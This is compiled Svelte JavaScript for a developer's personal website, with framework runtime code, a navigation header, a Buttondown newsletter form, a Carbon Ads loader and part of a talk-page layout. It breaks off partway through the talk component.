function noop() { }
function assign(tar, src) {
    // @ts-ignore
    for (const k in src)
        tar[k] = src[k];
    return tar;
}
function run(fn) {
    return fn();
}
function blank_object() {
    return Object.create(null);
}
function run_all(fns) {
    fns.forEach(run);
}
function is_function(thing) {
    return typeof thing === 'function';
}
function safe_not_equal(a, b) {
    return a != a ? b == b : a !== b || ((a && typeof a === 'object') || typeof a === 'function');
}
function create_slot(definition, ctx, $$scope, fn) {
    if (definition) {
        const slot_ctx = get_slot_context(definition, ctx, $$scope, fn);
        return definition[0](slot_ctx);
    }
}
function get_slot_context(definition, ctx, $$scope, fn) {
    return definition[1] && fn
        ? assign($$scope.ctx.slice(), definition[1](fn(ctx)))
        : $$scope.ctx;
}
function get_slot_changes(definition, $$scope, dirty, fn) {
    if (definition[2] && fn) {
        const lets = definition[2](fn(dirty));
        if ($$scope.dirty === undefined) {
            return lets;
        }
        if (typeof lets === 'object') {
            const merged = [];
            const len = Math.max($$scope.dirty.length, lets.length);
            for (let i = 0; i < len; i += 1) {
                merged[i] = $$scope.dirty[i] | lets[i];
            }
            return merged;
        }
        return $$scope.dirty | lets;
    }
    return $$scope.dirty;
}
function update_slot(slot, slot_definition, ctx, $$scope, dirty, get_slot_changes_fn, get_slot_context_fn) {
    const slot_changes = get_slot_changes(slot_definition, $$scope, dirty, get_slot_changes_fn);
    if (slot_changes) {
        const slot_context = get_slot_context(slot_definition, ctx, $$scope, get_slot_context_fn);
        slot.p(slot_context, slot_changes);
    }
}

function append(target, node) {
    target.appendChild(node);
}
function insert(target, node, anchor) {
    target.insertBefore(node, anchor || null);
}
function detach(node) {
    node.parentNode.removeChild(node);
}
function destroy_each(iterations, detaching) {
    for (let i = 0; i < iterations.length; i += 1) {
        if (iterations[i])
            iterations[i].d(detaching);
    }
}
function element(name) {
    return document.createElement(name);
}
function svg_element(name) {
    return document.createElementNS('http://www.w3.org/2000/svg', name);
}
function text(data) {
    return document.createTextNode(data);
}
function space() {
    return text(' ');
}
function empty() {
    return text('');
}
function listen(node, event, handler, options) {
    node.addEventListener(event, handler, options);
    return () => node.removeEventListener(event, handler, options);
}
function attr(node, attribute, value) {
    if (value == null)
        node.removeAttribute(attribute);
    else if (node.getAttribute(attribute) !== value)
        node.setAttribute(attribute, value);
}
function children(element) {
    return Array.from(element.childNodes);
}
function claim_element(nodes, name, attributes, svg) {
    for (let i = 0; i < nodes.length; i += 1) {
        const node = nodes[i];
        if (node.nodeName === name) {
            let j = 0;
            const remove = [];
            while (j < node.attributes.length) {
                const attribute = node.attributes[j++];
                if (!attributes[attribute.name]) {
                    remove.push(attribute.name);
                }
            }
            for (let k = 0; k < remove.length; k++) {
                node.removeAttribute(remove[k]);
            }
            return nodes.splice(i, 1)[0];
        }
    }
    return svg ? svg_element(name) : element(name);
}
function claim_text(nodes, data) {
    for (let i = 0; i < nodes.length; i += 1) {
        const node = nodes[i];
        if (node.nodeType === 3) {
            node.data = '' + data;
            return nodes.splice(i, 1)[0];
        }
    }
    return text(data);
}
function claim_space(nodes) {
    return claim_text(nodes, ' ');
}
function set_data(text, data) {
    data = '' + data;
    if (text.wholeText !== data)
        text.data = data;
}
function set_input_value(input, value) {
    input.value = value == null ? '' : value;
}
function set_style(node, key, value, important) {
    node.style.setProperty(key, value, important ? 'important' : '');
}
function query_selector_all(selector, parent = document.body) {
    return Array.from(parent.querySelectorAll(selector));
}
class HtmlTag {
    constructor(anchor = null) {
        this.a = anchor;
        this.e = this.n = null;
    }
    m(html, target, anchor = null) {
        if (!this.e) {
            this.e = element(target.nodeName);
            this.t = target;
            this.h(html);
        }
        this.i(anchor);
    }
    h(html) {
        this.e.innerHTML = html;
        this.n = Array.from(this.e.childNodes);
    }
    i(anchor) {
        for (let i = 0; i < this.n.length; i += 1) {
            insert(this.t, this.n[i], anchor);
        }
    }
    p(html) {
        this.d();
        this.h(html);
        this.i(this.a);
    }
    d() {
        this.n.forEach(detach);
    }
}

let current_component;
function set_current_component(component) {
    current_component = component;
}
function get_current_component() {
    if (!current_component)
        throw new Error(`Function called outside component initialization`);
    return current_component;
}
function onMount(fn) {
    get_current_component().$$.on_mount.push(fn);
}

const dirty_components = [];
const binding_callbacks = [];
const render_callbacks = [];
const flush_callbacks = [];
const resolved_promise = Promise.resolve();
let update_scheduled = false;
function schedule_update() {
    if (!update_scheduled) {
        update_scheduled = true;
        resolved_promise.then(flush);
    }
}
function add_render_callback(fn) {
    render_callbacks.push(fn);
}
let flushing = false;
const seen_callbacks = new Set();
function flush() {
    if (flushing)
        return;
    flushing = true;
    do {
        // first, call beforeUpdate functions
        // and update components
        for (let i = 0; i < dirty_components.length; i += 1) {
            const component = dirty_components[i];
            set_current_component(component);
            update(component.$$);
        }
        dirty_components.length = 0;
        while (binding_callbacks.length)
            binding_callbacks.pop()();
        // then, once components are updated, call
        // afterUpdate functions. This may cause
        // subsequent updates...
        for (let i = 0; i < render_callbacks.length; i += 1) {
            const callback = render_callbacks[i];
            if (!seen_callbacks.has(callback)) {
                // ...so guard against infinite loops
                seen_callbacks.add(callback);
                callback();
            }
        }
        render_callbacks.length = 0;
    } while (dirty_components.length);
    while (flush_callbacks.length) {
        flush_callbacks.pop()();
    }
    update_scheduled = false;
    flushing = false;
    seen_callbacks.clear();
}
function update($$) {
    if ($$.fragment !== null) {
        $$.update();
        run_all($$.before_update);
        const dirty = $$.dirty;
        $$.dirty = [-1];
        $$.fragment && $$.fragment.p($$.ctx, dirty);
        $$.after_update.forEach(add_render_callback);
    }
}
const outroing = new Set();
let outros;
function transition_in(block, local) {
    if (block && block.i) {
        outroing.delete(block);
        block.i(local);
    }
}
function transition_out(block, local, detach, callback) {
    if (block && block.o) {
        if (outroing.has(block))
            return;
        outroing.add(block);
        outros.c.push(() => {
            outroing.delete(block);
            if (callback) {
                if (detach)
                    block.d(1);
                callback();
            }
        });
        block.o(local);
    }
}

function get_spread_update(levels, updates) {
    const update = {};
    const to_null_out = {};
    const accounted_for = { $$scope: 1 };
    let i = levels.length;
    while (i--) {
        const o = levels[i];
        const n = updates[i];
        if (n) {
            for (const key in o) {
                if (!(key in n))
                    to_null_out[key] = 1;
            }
            for (const key in n) {
                if (!accounted_for[key]) {
                    update[key] = n[key];
                    accounted_for[key] = 1;
                }
            }
            levels[i] = n;
        }
        else {
            for (const key in o) {
                accounted_for[key] = 1;
            }
        }
    }
    for (const key in to_null_out) {
        if (!(key in update))
            update[key] = undefined;
    }
    return update;
}
function get_spread_object(spread_props) {
    return typeof spread_props === 'object' && spread_props !== null ? spread_props : {};
}
function create_component(block) {
    block && block.c();
}
function claim_component(block, parent_nodes) {
    block && block.l(parent_nodes);
}
function mount_component(component, target, anchor) {
    const { fragment, on_mount, on_destroy, after_update } = component.$$;
    fragment && fragment.m(target, anchor);
    // onMount happens before the initial afterUpdate
    add_render_callback(() => {
        const new_on_destroy = on_mount.map(run).filter(is_function);
        if (on_destroy) {
            on_destroy.push(...new_on_destroy);
        }
        else {
            // Edge case - component was destroyed immediately,
            // most likely as a result of a binding initialising
            run_all(new_on_destroy);
        }
        component.$$.on_mount = [];
    });
    after_update.forEach(add_render_callback);
}
function destroy_component(component, detaching) {
    const $$ = component.$$;
    if ($$.fragment !== null) {
        run_all($$.on_destroy);
        $$.fragment && $$.fragment.d(detaching);
        // TODO null out other refs, including component.$$ (but need to
        // preserve final state?)
        $$.on_destroy = $$.fragment = null;
        $$.ctx = [];
    }
}
function make_dirty(component, i) {
    if (component.$$.dirty[0] === -1) {
        dirty_components.push(component);
        schedule_update();
        component.$$.dirty.fill(0);
    }
    component.$$.dirty[(i / 31) | 0] |= (1 << (i % 31));
}
function init(component, options, instance, create_fragment, not_equal, props, dirty = [-1]) {
    const parent_component = current_component;
    set_current_component(component);
    const prop_values = options.props || {};
    const $$ = component.$$ = {
        fragment: null,
        ctx: null,
        // state
        props,
        update: noop,
        not_equal,
        bound: blank_object(),
        // lifecycle
        on_mount: [],
        on_destroy: [],
        before_update: [],
        after_update: [],
        context: new Map(parent_component ? parent_component.$$.context : []),
        // everything else
        callbacks: blank_object(),
        dirty
    };
    let ready = false;
    $$.ctx = instance
        ? instance(component, prop_values, (i, ret, ...rest) => {
            const value = rest.length ? rest[0] : ret;
            if ($$.ctx && not_equal($$.ctx[i], $$.ctx[i] = value)) {
                if ($$.bound[i])
                    $$.bound[i](value);
                if (ready)
                    make_dirty(component, i);
            }
            return ret;
        })
        : [];
    $$.update();
    ready = true;
    run_all($$.before_update);
    // `false` as a special case of no DOM component
    $$.fragment = create_fragment ? create_fragment($$.ctx) : false;
    if (options.target) {
        if (options.hydrate) {
            const nodes = children(options.target);
            // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
            $$.fragment && $$.fragment.l(nodes);
            nodes.forEach(detach);
        }
        else {
            // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
            $$.fragment && $$.fragment.c();
        }
        if (options.intro)
            transition_in(component.$$.fragment);
        mount_component(component, options.target, options.anchor);
        flush();
    }
    set_current_component(parent_component);
}
class SvelteComponent {
    $destroy() {
        destroy_component(this, 1);
        this.$destroy = noop;
    }
    $on(type, callback) {
        const callbacks = (this.$$.callbacks[type] || (this.$$.callbacks[type] = []));
        callbacks.push(callback);
        return () => {
            const index = callbacks.indexOf(callback);
            if (index !== -1)
                callbacks.splice(index, 1);
        };
    }
    $set() {
        // overridden by instance, if it has props
    }
}

var __build_img_webp__8 = "934f489599ec74f5.webp";

var __build_img__8 = "934f489599ec74f5.png";

var __build_img_webp__7 = "d3a8c5077b019f74.webp";

var __build_img__7 = "d3a8c5077b019f74.png";

var __build_img_webp__6 = "e5bf5b375e2e2f2d.webp";

var __build_img__6 = "e5bf5b375e2e2f2d.png";

var __build_img_webp__5 = "c98964eeeac64936.webp";

var __build_img__5 = "c98964eeeac64936.png";

var __build_img_webp__4 = "c1e616b4133d5873.webp";

var __build_img__4 = "c1e616b4133d5873.png";

var __build_img_webp__3 = "ab90e311b63f0961.webp";

var __build_img__3 = "ab90e311b63f0961.png";

var __build_img_webp__2 = "475f935654895105.webp";

var __build_img__2 = "475f935654895105.png";

var __build_img_webp__1 = "7f85dfac058d1204.webp";

var __build_img__1 = "7f85dfac058d1204.png";

var __build_img_webp__0 = "60eb649f71e09997.webp";

var __build_img__0 = "60eb649f71e09997.png";

/* src/layout/Header.svelte generated by Svelte v3.24.0 */

function create_fragment(ctx) {
	let header;
	let nav;
	let ul;
	let li0;
	let a0;
	let t0;
	let t1;
	let li1;
	let a1;
	let t2;
	let t3;
	let li2;
	let a2;
	let t4;
	let t5;
	let li3;
	let a3;
	let t6;
	let t7;
	let li4;
	let a4;
	let t8;
	let t9;
	let li5;
	let a5;
	let t10;
	let t11;
	let li6;
	let a6;
	let t12;
	let t13;
	let li7;
	let a7;
	let svg0;
	let path0;
	let t14;
	let a8;
	let svg1;
	let path1;

	return {
		c() {
			header = element("header");
			nav = element("nav");
			ul = element("ul");
			li0 = element("li");
			a0 = element("a");
			t0 = text("Tan Li Hau");
			t1 = space();
			li1 = element("li");
			a1 = element("a");
			t2 = text("About");
			t3 = space();
			li2 = element("li");
			a2 = element("a");
			t4 = text("Writings");
			t5 = space();
			li3 = element("li");
			a3 = element("a");
			t6 = text("Videos");
			t7 = space();
			li4 = element("li");
			a4 = element("a");
			t8 = text("Talks");
			t9 = space();
			li5 = element("li");
			a5 = element("a");
			t10 = text("Notes");
			t11 = space();
			li6 = element("li");
			a6 = element("a");
			t12 = text("Newsletter");
			t13 = space();
			li7 = element("li");
			a7 = element("a");
			svg0 = svg_element("svg");
			path0 = svg_element("path");
			t14 = space();
			a8 = element("a");
			svg1 = svg_element("svg");
			path1 = svg_element("path");
			this.h();
		},
		l(nodes) {
			header = claim_element(nodes, "HEADER", { class: true });
			var header_nodes = children(header);
			nav = claim_element(header_nodes, "NAV", {});
			var nav_nodes = children(nav);
			ul = claim_element(nav_nodes, "UL", { class: true });
			var ul_nodes = children(ul);
			li0 = claim_element(ul_nodes, "LI", { class: true });
			var li0_nodes = children(li0);
			a0 = claim_element(li0_nodes, "A", { href: true, class: true });
			var a0_nodes = children(a0);
			t0 = claim_text(a0_nodes, "Tan Li Hau");
			a0_nodes.forEach(detach);
			li0_nodes.forEach(detach);
			t1 = claim_space(ul_nodes);
			li1 = claim_element(ul_nodes, "LI", { class: true });
			var li1_nodes = children(li1);
			a1 = claim_element(li1_nodes, "A", { href: true, class: true });
			var a1_nodes = children(a1);
			t2 = claim_text(a1_nodes, "About");
			a1_nodes.forEach(detach);
			li1_nodes.forEach(detach);
			t3 = claim_space(ul_nodes);
			li2 = claim_element(ul_nodes, "LI", { class: true });
			var li2_nodes = children(li2);
			a2 = claim_element(li2_nodes, "A", { href: true, class: true });
			var a2_nodes = children(a2);
			t4 = claim_text(a2_nodes, "Writings");
			a2_nodes.forEach(detach);
			li2_nodes.forEach(detach);
			t5 = claim_space(ul_nodes);
			li3 = claim_element(ul_nodes, "LI", { class: true });
			var li3_nodes = children(li3);
			a3 = claim_element(li3_nodes, "A", { href: true, class: true });
			var a3_nodes = children(a3);
			t6 = claim_text(a3_nodes, "Videos");
			a3_nodes.forEach(detach);
			li3_nodes.forEach(detach);
			t7 = claim_space(ul_nodes);
			li4 = claim_element(ul_nodes, "LI", { class: true });
			var li4_nodes = children(li4);
			a4 = claim_element(li4_nodes, "A", { href: true, class: true });
			var a4_nodes = children(a4);
			t8 = claim_text(a4_nodes, "Talks");
			a4_nodes.forEach(detach);
			li4_nodes.forEach(detach);
			t9 = claim_space(ul_nodes);
			li5 = claim_element(ul_nodes, "LI", { class: true });
			var li5_nodes = children(li5);
			a5 = claim_element(li5_nodes, "A", { href: true, class: true });
			var a5_nodes = children(a5);
			t10 = claim_text(a5_nodes, "Notes");
			a5_nodes.forEach(detach);
			li5_nodes.forEach(detach);
			t11 = claim_space(ul_nodes);
			li6 = claim_element(ul_nodes, "LI", { class: true });
			var li6_nodes = children(li6);
			a6 = claim_element(li6_nodes, "A", { href: true, class: true });
			var a6_nodes = children(a6);
			t12 = claim_text(a6_nodes, "Newsletter");
			a6_nodes.forEach(detach);
			li6_nodes.forEach(detach);
			t13 = claim_space(ul_nodes);
			li7 = claim_element(ul_nodes, "LI", { class: true });
			var li7_nodes = children(li7);

			a7 = claim_element(li7_nodes, "A", {
				"aria-label": true,
				href: true,
				class: true
			});

			var a7_nodes = children(a7);

			svg0 = claim_element(
				a7_nodes,
				"svg",
				{
					viewBox: true,
					width: true,
					height: true,
					class: true
				},
				1
			);

			var svg0_nodes = children(svg0);
			path0 = claim_element(svg0_nodes, "path", { d: true }, 1);
			children(path0).forEach(detach);
			svg0_nodes.forEach(detach);
			a7_nodes.forEach(detach);
			t14 = claim_space(li7_nodes);

			a8 = claim_element(li7_nodes, "A", {
				"aria-label": true,
				href: true,
				class: true
			});

			var a8_nodes = children(a8);

			svg1 = claim_element(
				a8_nodes,
				"svg",
				{
					viewBox: true,
					width: true,
					height: true,
					class: true
				},
				1
			);

			var svg1_nodes = children(svg1);
			path1 = claim_element(svg1_nodes, "path", { d: true }, 1);
			children(path1).forEach(detach);
			svg1_nodes.forEach(detach);
			a8_nodes.forEach(detach);
			li7_nodes.forEach(detach);
			ul_nodes.forEach(detach);
			nav_nodes.forEach(detach);
			header_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(a0, "href", "/");
			attr(a0, "class", "svelte-1axnxyd");
			attr(li0, "class", "svelte-1axnxyd");
			attr(a1, "href", "/about");
			attr(a1, "class", "svelte-1axnxyd");
			attr(li1, "class", "svelte-1axnxyd");
			attr(a2, "href", "/blogs");
			attr(a2, "class", "svelte-1axnxyd");
			attr(li2, "class", "svelte-1axnxyd");
			attr(a3, "href", "/videos");
			attr(a3, "class", "svelte-1axnxyd");
			attr(li3, "class", "svelte-1axnxyd");
			attr(a4, "href", "/talks");
			attr(a4, "class", "svelte-1axnxyd");
			attr(li4, "class", "svelte-1axnxyd");
			attr(a5, "href", "/notes");
			attr(a5, "class", "svelte-1axnxyd");
			attr(li5, "class", "svelte-1axnxyd");
			attr(a6, "href", "/newsletter");
			attr(a6, "class", "svelte-1axnxyd");
			attr(li6, "class", "svelte-1axnxyd");
			attr(path0, "d", "M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66\n    10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5\n    4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z");
			attr(svg0, "viewBox", "0 0 24 24");
			attr(svg0, "width", "1em");
			attr(svg0, "height", "1em");
			attr(svg0, "class", "svelte-1axnxyd");
			attr(a7, "aria-label", "Twitter account");
			attr(a7, "href", "https://twitter.com/lihautan");
			attr(a7, "class", "svelte-1axnxyd");
			attr(path1, "d", "M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0\n    0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07\n    5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65\n    5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42\n    3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22");
			attr(svg1, "viewBox", "0 0 24 24");
			attr(svg1, "width", "1em");
			attr(svg1, "height", "1em");
			attr(svg1, "class", "svelte-1axnxyd");
			attr(a8, "aria-label", "Github account");
			attr(a8, "href", "https://github.com/tanhauhau");
			attr(a8, "class", "svelte-1axnxyd");
			attr(li7, "class", "social svelte-1axnxyd");
			attr(ul, "class", "svelte-1axnxyd");
			attr(header, "class", "svelte-1axnxyd");
		},
		m(target, anchor) {
			insert(target, header, anchor);
			append(header, nav);
			append(nav, ul);
			append(ul, li0);
			append(li0, a0);
			append(a0, t0);
			append(ul, t1);
			append(ul, li1);
			append(li1, a1);
			append(a1, t2);
			append(ul, t3);
			append(ul, li2);
			append(li2, a2);
			append(a2, t4);
			append(ul, t5);
			append(ul, li3);
			append(li3, a3);
			append(a3, t6);
			append(ul, t7);
			append(ul, li4);
			append(li4, a4);
			append(a4, t8);
			append(ul, t9);
			append(ul, li5);
			append(li5, a5);
			append(a5, t10);
			append(ul, t11);
			append(ul, li6);
			append(li6, a6);
			append(a6, t12);
			append(ul, t13);
			append(ul, li7);
			append(li7, a7);
			append(a7, svg0);
			append(svg0, path0);
			append(li7, t14);
			append(li7, a8);
			append(a8, svg1);
			append(svg1, path1);
		},
		p: noop,
		i: noop,
		o: noop,
		d(detaching) {
			if (detaching) detach(header);
		}
	};
}

class Header extends SvelteComponent {
	constructor(options) {
		super();
		init(this, options, null, create_fragment, safe_not_equal, {});
	}
}

/* src/layout/Newsletter.svelte generated by Svelte v3.24.0 */

function create_fragment$1(ctx) {
	let div1;
	let h1;
	let t0;
	let t1;
	let h2;
	let t2;
	let t3;
	let form;
	let div0;
	let input0;
	let t4;
	let input1;
	let input1_disabled_value;
	let t5;
	let input2;
	let t6;
	let p;
	let t7;
	let mounted;
	let dispose;

	return {
		c() {
			div1 = element("div");
			h1 = element("h1");
			t0 = text("Subscribe to my newsletter");
			t1 = space();
			h2 = element("h2");
			t2 = text("Get the latest blog posts and project updates delivered right to your inbox");
			t3 = space();
			form = element("form");
			div0 = element("div");
			input0 = element("input");
			t4 = space();
			input1 = element("input");
			t5 = space();
			input2 = element("input");
			t6 = space();
			p = element("p");
			t7 = text("Powered by Buttondown.");
			this.h();
		},
		l(nodes) {
			div1 = claim_element(nodes, "DIV", { class: true });
			var div1_nodes = children(div1);
			h1 = claim_element(div1_nodes, "H1", {});
			var h1_nodes = children(h1);
			t0 = claim_text(h1_nodes, "Subscribe to my newsletter");
			h1_nodes.forEach(detach);
			t1 = claim_space(div1_nodes);
			h2 = claim_element(div1_nodes, "H2", { class: true });
			var h2_nodes = children(h2);
			t2 = claim_text(h2_nodes, "Get the latest blog posts and project updates delivered right to your inbox");
			h2_nodes.forEach(detach);
			t3 = claim_space(div1_nodes);

			form = claim_element(div1_nodes, "FORM", {
				action: true,
				method: true,
				target: true,
				onsubmit: true,
				class: true
			});

			var form_nodes = children(form);
			div0 = claim_element(form_nodes, "DIV", { class: true });
			var div0_nodes = children(div0);

			input0 = claim_element(div0_nodes, "INPUT", {
				type: true,
				name: true,
				id: true,
				"aria-label": true,
				placeholder: true,
				class: true
			});

			t4 = claim_space(div0_nodes);

			input1 = claim_element(div0_nodes, "INPUT", {
				type: true,
				value: true,
				disabled: true,
				class: true
			});

			div0_nodes.forEach(detach);
			t5 = claim_space(form_nodes);

			input2 = claim_element(form_nodes, "INPUT", {
				type: true,
				value: true,
				name: true,
				class: true
			});

			t6 = claim_space(form_nodes);
			p = claim_element(form_nodes, "P", { class: true });
			var p_nodes = children(p);
			t7 = claim_text(p_nodes, "Powered by Buttondown.");
			p_nodes.forEach(detach);
			form_nodes.forEach(detach);
			div1_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(h2, "class", "svelte-1k1s1co");
			attr(input0, "type", "email");
			attr(input0, "name", "email");
			attr(input0, "id", "bd-email");
			attr(input0, "aria-label", "email address");
			attr(input0, "placeholder", "youremail@example.com");
			attr(input0, "class", "svelte-1k1s1co");
			attr(input1, "type", "submit");
			input1.value = "Subscribe";
			input1.disabled = input1_disabled_value = !/*email*/ ctx[0];
			attr(input1, "class", "svelte-1k1s1co");
			attr(div0, "class", "form-item svelte-1k1s1co");
			attr(input2, "type", "hidden");
			input2.value = "1";
			attr(input2, "name", "embed");
			attr(input2, "class", "svelte-1k1s1co");
			attr(p, "class", "svelte-1k1s1co");
			attr(form, "action", "https://buttondown.email/api/emails/embed-subscribe/lihautan");
			attr(form, "method", "post");
			attr(form, "target", "popupwindow");
			attr(form, "onsubmit", "window.open('https://buttondown.email/lihautan', 'popupwindow')");
			attr(form, "class", "embeddable-buttondown-form");
			attr(div1, "class", "form svelte-1k1s1co");
		},
		m(target, anchor) {
			insert(target, div1, anchor);
			append(div1, h1);
			append(h1, t0);
			append(div1, t1);
			append(div1, h2);
			append(h2, t2);
			append(div1, t3);
			append(div1, form);
			append(form, div0);
			append(div0, input0);
			set_input_value(input0, /*email*/ ctx[0]);
			append(div0, t4);
			append(div0, input1);
			append(form, t5);
			append(form, input2);
			append(form, t6);
			append(form, p);
			append(p, t7);

			if (!mounted) {
				dispose = listen(input0, "input", /*input0_input_handler*/ ctx[1]);
				mounted = true;
			}
		},
		p(ctx, [dirty]) {
			if (dirty & /*email*/ 1 && input0.value !== /*email*/ ctx[0]) {
				set_input_value(input0, /*email*/ ctx[0]);
			}

			if (dirty & /*email*/ 1 && input1_disabled_value !== (input1_disabled_value = !/*email*/ ctx[0])) {
				input1.disabled = input1_disabled_value;
			}
		},
		i: noop,
		o: noop,
		d(detaching) {
			if (detaching) detach(div1);
			mounted = false;
			dispose();
		}
	};
}

function instance($$self, $$props, $$invalidate) {
	let email;

	function input0_input_handler() {
		email = this.value;
		$$invalidate(0, email);
	}

	return [email, input0_input_handler];
}

class Newsletter extends SvelteComponent {
	constructor(options) {
		super();
		init(this, options, instance, create_fragment$1, safe_not_equal, {});
	}
}

/* src/layout/CarbonAd.svelte generated by Svelte v3.24.0 */

function instance$1($$self) {
	onMount(() => {
		setTimeout(
			() => {
				if (window.innerWidth > 1080) {
					const script = document.createElement("script");
					script.async = true;
					script.type = "text/javascript";
					script.src = "//cdn.carbonads.com/carbon.js?serve=CE7ITK3E&placement=lihautancom";
					script.id = "_carbonads_js";
					document.body.appendChild(script);
				}
			},
			5000
		);

		return () => {
			try {
				const ad = document.getElementById("carbonads");
				ad.parentNode.removeChild(ad);
			} catch(error) {
				
			} // ignore them
		};
	});

	return [];
}

class CarbonAd extends SvelteComponent {
	constructor(options) {
		super();
		init(this, options, instance$1, null, safe_not_equal, {});
	}
}

var image = "https://lihautan.com/third-party-css-is-not-safe/assets/hero-twitter-a901314e.jpg";

/* src/layout/talk.svelte generated by Svelte v3.24.0 */

function get_each_context(ctx, list, i) {
	const child_ctx = ctx.slice();
	child_ctx[9] = list[i];
	return child_ctx;
}

function get_each_context_1(ctx, list, i) {
	const child_ctx = ctx.slice();
	child_ctx[9] = list[i];
	return child_ctx;
}

// (37:2) {#each tags as tag}
function create_each_block_1(ctx) {
	let meta;
	let meta_content_value;

	return {
		c() {
			meta = element("meta");
			this.h();
		},
		l(nodes) {
			meta = claim_element(nodes, "META", { name: true, content: true });
			this.h();
		},
		h() {
			attr(meta, "name", "keywords");
			attr(meta, "content", meta_content_value = /*tag*/ ctx[9]);
		},
		m(target, anchor) {
			insert(target, meta, anchor);
		},
		p(ctx, dirty) {
			if (dirty & /*tags*/ 4 && meta_content_value !== (meta_content_value = /*tag*/ ctx[9])) {
				attr(meta, "content", meta_content_value);
			}
		},
		d(detaching) {
			if (detaching) detach(meta);
		}
	};
}

// (76:2) {#each tags as tag}
function create_each_block(ctx) {
	let span;
	let t_value = /*tag*/ ctx[9] + "";
	let t;

	return {
		c() {
			span = element("span");
			t = text(t_value);
			this.h();
		},
		l(nodes) {
			span = claim_element(nodes, "SPAN", { class: true });
			var span_nodes = children(span);
			t = claim_text(span_nodes, t_value);
			span_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(span, "class", "svelte-hvyckn");
		},
		m(target, anchor) {
			insert(target, span, anchor);
			append(span, t);
		},
		p(ctx, dirty) {
			if (dirty & /*tags*/ 4 && t_value !== (t_value = /*tag*/ ctx[9] + "")) set_data(t, t_value);
		},
		d(detaching) {
			if (detaching) detach(span);
		}
	};
}

// (81:2) {#if (occasion && occasionLink) || videoLink}
function create_if_block(ctx) {
	let div;
	let if_block0_anchor;
	let if_block0 = /*occasion*/ ctx[3] && /*occasionLink*/ ctx[4] && create_if_block_2(ctx);
	let if_block1 = /*videoLink*/ ctx[5] && create_if_block_1(ctx);

	return {
		c() {
			div = element("div");
			if (if_block0) if_block0.c();
			if_block0_anchor = empty();
			if (if_block1) if_block1.c();
			this.h();
		},
		l(nodes) {
			div = claim_element(nodes, "DIV", { class: true });
			var div_nodes = children(div);
			if (if_block0) if_block0.l(div_nodes);
			if_block0_anchor = empty();
			if (if_block1) if_block1.l(div_nodes);
			div_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(div, "class", "venue svelte-hvyckn");
		},
		m(target, anchor) {
			insert(target, div, anchor);
			if (if_block0) if_block0.m(div, null);
			append(div, if_block0_anchor);
			if (if_block1) if_block1.m(div, null);
		},
		p(ctx, dirty) {
			if (/*occasion*/ ctx[3] && /*occasionLink*/ ctx[4]) {
				if (if_block0) {
					if_block0.p(ctx, dirty);
				} else {
					if_block0 = create_if_block_2(ctx);
					if_block0.c();
					if_block0.m(div, if_block0_anchor);
				}
			} else if (if_block0) {
				if_block0.d(1);
				if_block0 = null;
			}

			if (/*videoLink*/ ctx[5]) {
				if (if_block1) {
					if_block1.p(ctx, dirty);
				} else {
					if_block1 = create_if_block_1(ctx);
					if_block1.c();
					if_block1.m(div, null);
				}
			} else if (if_block1) {
				if_block1.d(1);
				if_block1 = null;
			}
		},
		d(detaching) {
			if (detaching) detach(div);
			if (if_block0) if_block0.d();
			if (if_block1) if_block1.d();
		}
	};
}

// (82:23) {#if occasion && occasionLink}
function create_if_block_2(ctx) {
	let t0;
	let a;
	let t1;

	return {
		c() {
			t0 = text("Talk given at: ");
			a = element("a");
			t1 = text(/*occasion*/ ctx[3]);
			this.h();
		},
		l(nodes) {
			t0 = claim_text(nodes, "Talk given at: ");
			a = claim_element(nodes, "A", { href: true, class: true });
			var a_nodes = children(a);
			t1 = claim_text(a_nodes, /*occasion*/ ctx[3]);
			a_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(a, "href", /*occasionLink*/ ctx[4]);
			attr(a, "class", "svelte-hvyckn");
		},
		m(target, anchor) {
			insert(target, t0, anchor);
			insert(target, a, anchor);
			append(a, t1);
		},
		p(ctx, dirty) {
			if (dirty & /*occasion*/ 8) set_data(t1, /*occasion*/ ctx[3]);

			if (dirty & /*occasionLink*/ 16) {
				attr(a, "href", /*occasionLink*/ ctx[4]);
			}
		},
		d(detaching) {
			if (detaching) detach(t0);
			if (detaching) detach(a);
		}
	};
}

// (82:110) {#if videoLink}
function create_if_block_1(ctx) {
	let a;
	let t;

	return {
		c() {
			a = element("a");
			t = text("(Video)");
			this.h();
		},
		l(nodes) {
			a = claim_element(nodes, "A", { href: true, class: true });
			var a_nodes = children(a);
			t = claim_text(a_nodes, "(Video)");
			a_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(a, "href", /*videoLink*/ ctx[5]);
			attr(a, "class", "svelte-hvyckn");
		},
		m(target, anchor) {
			insert(target, a, anchor);
			append(a, t);
		},
		p(ctx, dirty) {
			if (dirty & /*videoLink*/ 32) {
				attr(a, "href", /*videoLink*/ ctx[5]);
			}
		},
		d(detaching) {
			if (detaching) detach(a);
		}
	};
}

function create_fragment$2(ctx) {
	let title_value;
	let meta0;
	let meta1;
	let meta2;
	let meta3;
	let meta4;
	let meta5;
	let meta6;
	let meta7;
	let meta8;
	let meta9;
	let meta10;
	let meta11;
	let meta12;
	let html_tag;

	let raw0_value = `<script type="application/ld+json">${JSON.stringify({
		"@context": "https://schema.org",
		"@type": "Article",
		author: /*jsonLdAuthor*/ ctx[6],
		copyrightHolder: /*jsonLdAuthor*/ ctx[6],
		copyrightYear: "2020",
		creator: /*jsonLdAuthor*/ ctx[6],
		publisher: /*jsonLdAuthor*/ ctx[6],
		description: /*description*/ ctx[1],
		headline: /*title*/ ctx[0],
		name: /*title*/ ctx[0],
		inLanguage: "en"
	})}</script>` + "";

	let html_anchor;
